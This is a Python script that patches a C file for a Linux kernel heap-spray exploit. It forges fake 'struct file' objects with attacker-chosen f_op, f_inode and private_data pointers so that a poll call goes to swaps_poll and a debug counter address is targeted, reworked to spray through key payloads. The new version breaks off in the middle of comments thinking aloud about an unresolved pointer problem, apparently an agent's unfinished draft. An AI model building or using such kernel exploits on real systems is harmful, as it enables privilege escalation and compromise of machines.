import re

with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

text = text.replace('#include <sys/sysmacros.h>', '#include <sys/sysmacros.h>\n#include <sys/syscall.h>\n#define KEY_SPEC_PROCESS_KEYRING -2')

old_spray = """    int P_ROUNDS = 20;
    int PAGES_PER = 400; // Total 8000 pages
    void *spray_pages[P_ROUNDS * PAGES_PER];
    int hit = 0;
    
    for (int r = 0; r < P_ROUNDS; r++) {
        for (int i = 0; i < PAGES_PER; i++) {
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p == MAP_FAILED) {
                printf("[-] mmap failed round %d iter %d\\n", r, i);
                break;
            }
            // Page fault it to force physical allocation
            *(volatile char *)p = 0;
            spray_pages[r * PAGES_PER + i] = p;
            char *page = (char *)p;
            
            // Write fake struct file at every 256 bytes
            for (size_t off = 0; off < 4096; off += 256) {
                uint64_t base = (uint64_t)(page + off);
                
                // M4 layout + M5 poll dispatch
                *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
                // fake fops points to itself
                *(uint64_t *)(base + 40) = base; // f_op
                *(uint32_t *)(base + 48) = 0;    // f_lock
                *(uint64_t *)(base + 56) = 1;    // f_count
                *(uint32_t *)(base + 68) = 0x20000; // f_mode (FMODE_CAN_READ)
                *(uint64_t *)(base + 208) = empty_zero_page; // f_ep (cleanup safe)
                *(uint64_t *)(base + 184) = 0;   // f_version
                
                // fops->poll
                *(uint64_t *)(base + 72) = swaps_poll_addr;
                
                // private_data (target address - 0x60)
                *(uint64_t *)(base + 200) = dbg_counter_addr - 0x60;
            }
        }"""

new_spray = """    int P_ROUNDS = 50;
    int PAGES_PER = 100; // Total 5000 pages
    int hit = 0;
    
    char payload[4096 - 24];
    memset(payload, 0, sizeof(payload));
    
    // Write fake struct file at every 256 bytes
    // Since data starts at offset 24 in user_key_payload, we must subtract 24!
    for (size_t file_off = 0; file_off < 4096; file_off += 256) {
        if (file_off < 24) continue; // Can't control offset 0 because of header!
        
        uint64_t base = (uint64_t)(payload + file_off - 24);
        
        // M4 layout + M5 poll dispatch
        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
        
        // fake fops points to itself. But wait! The actual memory address of this file object
        // in kernel is unknown. However, we know it's page aligned!
        // Wait, we DO NOT know the page address!
        // Oh no! If we don't know the page address, how can we point f_op to itself?!
        // Wait... f_op doesn't HAVE to point to itself! It can point to empty_zero_page!
        // BUT we need f_op->poll to be swaps_poll!
        // empty_zero_page + 72 MUST be swaps_poll! But empty_zero_page is read-only zero!
        
        // Let me pause..."""

# Let's think about this!
